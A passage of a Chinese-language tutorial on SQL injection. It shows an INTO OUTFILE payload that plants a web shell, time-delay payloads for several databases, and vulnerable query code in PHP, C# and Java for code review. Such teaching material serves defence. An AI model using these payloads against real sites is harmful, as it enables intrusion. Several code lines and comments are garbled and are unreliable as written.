<span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/var/www/victim.com/shell.php'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png"></p>
<h4 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h4><p>没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入</p>
<p>mssql内置的设置延迟的命令<code>waitfor delay 'hours:minutes:seconds'</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个payload意义就是让数据库延迟5秒返回数据</p>
<p>mysql种没有时间延迟的函数，它使用一些执行时间很长的函数，来引入延迟。比如<code>benchmark</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">benchmark<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span>encode<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string">'tets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将后面的命令执行10000次，这样时间就长了，为了更明显，可以增大次数</p>
<p>oracle PL/SQL</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span>
DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#休眠五秒</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>限制：不能直接子查询，管理员才能使用DBMS_LOCK包</p>
<p>另一个方法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">32</span> <span class="token operator">or</span> l<span class="token operator">=</span>dbms_pipe<span class="token punctuation">.</span>receive_ message<span class="token punctuation">(</span><span class="token string">'RDS'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒</p>
<p>PostgreSQL</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="自动寻找SQL注入"><a href="#自动寻找SQL注入" class="headerlink" title="自动寻找SQL注入"></a>自动寻找SQL注入</h3><ul>
<li>识别数据输入</li>
<li>注入数据</li>
<li>检测响应中的异常</li>
</ul>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="HP-WebInspect"><a href="#HP-WebInspect" class="headerlink" title="HP WebInspect"></a>HP WebInspect</h5><h5 id="IBM-Rational-AppScan"><a href="#IBM-Rational-AppScan" class="headerlink" title="IBM Rational AppScan"></a>IBM Rational AppScan</h5><h5 id="HP-Scrawlr"><a href="#HP-Scrawlr" class="headerlink" title="HP Scrawlr"></a>HP Scrawlr</h5><h5 id="SQLiX"><a href="#SQLiX" class="headerlink" title="SQLiX"></a>SQLiX</h5><h5 id="Paros-Proxy-Zed-Attack-Proxy"><a href="#Paros-Proxy-Zed-Attack-Proxy" class="headerlink" title="Paros Proxy/Zed Attack Proxy"></a>Paros Proxy/Zed Attack Proxy</h5><h2 id="复查代码中的SQL注入"><a href="#复查代码中的SQL注入" class="headerlink" title="复查代码中的SQL注入"></a>复查代码中的SQL注入</h2><p>在代码中找bug，有代码审计的味道，审计的是sql代码</p>
<h3 id="复查源代码中的SQL注入"><a href="#复查源代码中的SQL注入" class="headerlink" title="复查源代码中的SQL注入"></a>复查源代码中的SQL注入</h3><ul>
<li>静态代码分析：分析源代码，但不执行</li>
<li>动态代码分析：在执行代码是分析</li>
<li>渗入点(安全敏感函数)：易受攻击的位置</li>
</ul>
<p>从渗入点进入审查，找到注入参数的位置，分析函数</p>
<h4 id="危险的编码行为"><a href="#危险的编码行为" class="headerlink" title="危险的编码行为"></a>危险的编码行为</h4><h5 id="将未验证的输入拼接成SQL语句并执行"><a href="#将未验证的输入拼接成SQL语句并执行" class="headerlink" title="将未验证的输入拼接成SQL语句并执行"></a>将未验证的输入拼接成SQL语句并执行</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//在PHP中执行一条动态构造的SQL语句</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM table WHERE field = '<span class="token interpolation"><span class="token variable">$_GET</span></span>["</span>input"<span class="token punctuation">]</span>'<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">//在C#中执行一条动态构造的SQL语句
SqlCommand command = new SqlCommmand("SELECT * FROM table WHERE field = '" + request.getParameter ("input") + "'" ,connection); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//在Java中执行一条动态构造的SQL语句</span>
<span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM table WHERE field = '"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="存储过程也会有SQL注入"><a href="#存储过程也会有SQL注入" class="headerlink" title="存储过程也会有SQL注入"></a>存储过程也会有SQL注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MS SQL Server中易受攻击的存储过程</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span>
<span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span>
<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MySQL中易受攻击的存储过程</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">SET</span> <span class="token variable">@param</span> <span class="token operator">=</span> input<span class="token punctuation">;</span>
<span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'SELECT field FROM table WHERE field='</span><span class="token punctuation">,</span><span class="token variable">@param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">PREPARE</span> stmt <span class="token keyword">FROM</span> <span class="token variable">@sql</span><span class="token punctuation">;</span>
<span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span>
<span class="token keyword">DEALLOCATE</span> <span class="token keyword">PREPARE</span> stmt<span class="token punctuation">;</span>
<span class="token keyword">End</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Oracle中易受攻击的存储过程</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token operator">IN</span> VARCHAR2<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">sql</span> VARCHAR2<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">sql</span> :<span class="token operator">=</span><span class="token string">'SELECT field FROM table WHERE field = '''</span> <span class="token operator">||</span> input <span class="token operator">||</span> <span class="token string">''''</span><span class="token punctuation">;</span>
<span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token keyword">sql</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//在PHP中动态地执行SQL存储过程</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select SP_StoredProcedure(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">//在C#中动态地执行SQL存储过程</span>
SqlCommand cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlCommand</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SP_StoredProceduren"</span><span class="token punctuation">,</span> conn<span class="token punctuation">)</span><span class="token punctuation">;</span>
cmd<span class="token operator">.</span>CommandType <span class="token operator">=</span> CommandType<span class="token operator">.</span>StoredProcedure<span class="token punctuation">;</span>
cmd<span class="token operator">.</span>Parameters<span class="token operator">.</span><span class="token function">Add</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SqlParameter</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"@input"</span><span class="token punctuation">,</span>
request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
SqlDataReader rdr <span class="token operator">=</span> cmd<span class="token operator">.</span><span class="token function">ExecteReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//在Java中动态地执行SQL存储过程</span>
CallableStatement cs <span class="token operator">=</span> con<span class="token operator">.</span><span class="token function">prepareCall</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"{call SP_StoredProcedure request.getParameter("</span>input<span class="token string double-quoted-string">")}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword type-declaration">string</span> output <span class="token operator">=</span> cs<span class="token operator">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="PHP中HTTP函数"><a href="#PHP中HTTP函数" class="headerlink" title="PHP中HTTP函数"></a>PHP中HTTP函数</h5><p>php表单提交有两种方式：GET、POST</p>
<p>GET方式显式提交，地址栏可以看到请求参数，并且有大小限制</p>
<p><code>test.php?id=1&amp;num=2</code></p>
<p>POST隐式提交，需要抓包才能看到参数，没有大小限制</p>
<p><code>&amp;</code> <code>;</code>分割参数，<code>=</code>分割参数名称和值</p>
<p>一种特殊的参数<code>cookie</code>通常保存在服务器上用于验证</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_GET</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> <span class="token constant">GET</span>方法传递的变量。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$HTTP_GET_VARS</span>：与<span class="token variable">$_GET</span>相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_GET_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_POST</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> <span class="token constant">POST</span>方法传递的变量。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$HTTP_POST_VARS</span>：与<span class="token variable">$_POST</span> 相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_POST_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_REQUEST</span>：一个关联数组，包含<span class="token variable">$_GET</span>、$ <span class="token constant">POST</span>和<span class="token variable">$_</span>（：<span class="token number">001</span><span class="token operator">&lt;</span><span class="token operator">^</span>的内容。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_COOKIE</span>：一个关联数组，存放通过<span class="token constant">HTTP</span> cookie传递给当前脚本的变量。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$HTTP_COOKIE_VARS</span>：与<span class="token variable">$_COOKIE</span>相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_COOKIE_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SERVER</span>：服务器及执行环境的信息。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$HTTP_SERVER_VARS</span>：与<span class="token variable">$_SERVER</span> 相同，在<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> 中已弃用。
<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_SERVER_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php.ini中<code>register_globals=On</code>时，将EGPCS（Environment、GET、POST、Cookie、Server）注册成全局变量，已被遗弃并且处于Off状态。</p>
<h5 id="JAVA中HTTP函数"><a href="#JAVA中HTTP函数" class="headerlink" title="JAVA中HTTP函数"></a>JAVA中HTTP函数</h5><p>HTTP请求对象的类名和接口名称是<code>HTTPServletRequest</code>,引用是写成<code>javax.servlet.HttpServletRequest</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//getParameter()	返回所请求的给定参数的值</span>
<span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getParameterValues()	以一个数组的方式返回给定参数请求的所有值</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> string_array <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getQueryString()	返回请求的查询字符串</span>
<span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getHeaders()	返回所请求的头的值</span>
sting string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getHeaders()	以一个字符串对象的枚举返回请求头</span>
<span class="token class-name">Enumeration</span> enumeration_object <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getRequestedSessionld()	返回客户端指定的 Session ID</span>
<span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestedSessionld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//getCookies()	返回一个cookie对象的数组</span>
<span class="token class-name">Cookie</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">Cookie_array</span> <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//cookie.getValue()	返回所请求的给定cookie的值</span>
<span class="token class-name">String</span> string_variale <span class="token operator">=</span> <span class="token class-name">Cookie_array</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="C-中HTTP函数"><a href="#C-中HTTP函数" class="headerlink" title="C#中HTTP函数"></a>C#中HTTP函数</h5><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//HttpCookieCollection	所有 cookie 的集合
HttpCookieCollection variable = Request.Cookies;
//Form―所有表单值的集合
string variable = Request.Form["name"];
//Headers	所有头的集合
string variable = Request.Headers["name"];
//Params 所有查询字符串、表单、cookie和服务器变量的组合集
string variable = Request.Params["name"];
//Querystring	所有查询字符串项的集合
string variable = Request.Querystring["name"];
//Servervariable	所有Web服务器变量的集合
string variable = Request.Servervariables["name"];
//Url	返回一个URI类型的对象，其Query属性包含了 URI中的信息，比如?foo=bar
Uri object_variable = Request.Url;
string variable = object_variable.Query;
//UserAgent	包含浏览器的用户代理头
string variable = Request.UserAgent;
//UserHostAddress	包含客户端的远程IP地址
string variable = Request.UserHostAddress;
//UserHostName	 含客户端的远程主机名
string variable = Request.UserHostName;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="危险的函数"><a href="#危险的函数" class="headerlink" title="危险的函数"></a>危险的函数</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//mssql_query ()	向当前使用的数据库发送一个查询</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//mysql_query ()	向当前使用的数据库发送一个查询</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//mysql_db_query ()	选择一个数据库，在该数据库上执行一个查询</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_db_query</span> <span class="token punctuation">(</span><span class="token variable">$dbf</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//oci_parse ()	在语句执行之前对其进行解析</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">oci_parse</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ociexecute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ora_parse ()	在语句执行之前对其进行解析</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ora_parse</span><span class="token punctuation">(</span><span class="token variable">$cursorr</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token function">ora_exec</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token comment">//mssql_bind ()	向存储过程添加一个参数</span>
<span class="token function">mssql_bind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stmt<span class="token punctuation">,</span> <span class="token number">1</span>@param<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token constant">SQLVARCHAR</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//odbc_prepare ()	准备一条执行语句</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">odbc_prepare</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//odbc_ exec ()	准备并执行一条SQL语句</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_exec</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_query一执行一个查询(曾称为pg_exec)</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_exec—*¥兼容性原因依然可用，但建议用户使用新的函数名</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_exec</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">/</span> <span class="token operator">/</span>pg_send_query—发送—异步查询	乙
<span class="token function">pg_send_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_send_query_params一向服务器提交一个命令并分离参数，无须等待结果</span>
<span class="token function">pg_send_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span>
<span class="token comment">//pg_query_params一向服务器提交一个命令并等待结果</span>
<span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span>
<span class="token comment">//pg_send_prepare一发送一个请求以创建一条具有指定参数的预备语句，无须等待完成</span>
pg <span class="token function">send_prepare</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token operator">*</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_send_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_pr epare—S送一个请求以劄建一条具有指定参数的预备语句并等待完成</span>
<span class="token function">pg_prepare</span><span class="token punctuation">(</span><span class="token variable">$connz</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$1</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> nmy_query"<span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_select一根据指定的具有field=&gt;value的assoc_array选择记录</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_select</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span>
<span class="token comment">//pg_update (Y—用数据更新与指定条件_的记录</span>
<span class="token function">pg_update</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$arr_update</span><span class="token punctuation">,</span> <span class="token variable">$arr_where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//pg_insert ()—将 assoc_array 的值插入到 table_name 指定的表中</span>
<span class="token function">pg_insert</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span>
<span class="token comment">//pg_delete () 一根据assoc_array中指定的键和值删除表中的记录</span>
<span class="token function">pg_delete</span><span class="token punctuation">(</span><span class="token variable">$connr</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//createStatement ()一仓d建一个语句对象以便向数据库发送SQL语句</span>
statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//prepareStatement () 一创建一条预编译的SQL语句并将其保存到对象中</span>
<span class="token class-name">PreparedStatement</span> sql <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//executeQuery () 一 行给定的SQL语句，从指定的表中获取数据</span>
result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//executeUpdate ()— 行一条SQL语句，该语句可能是一条条返回任何值的INSERT、UPDATE或 //DELETE 语句</span>
result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
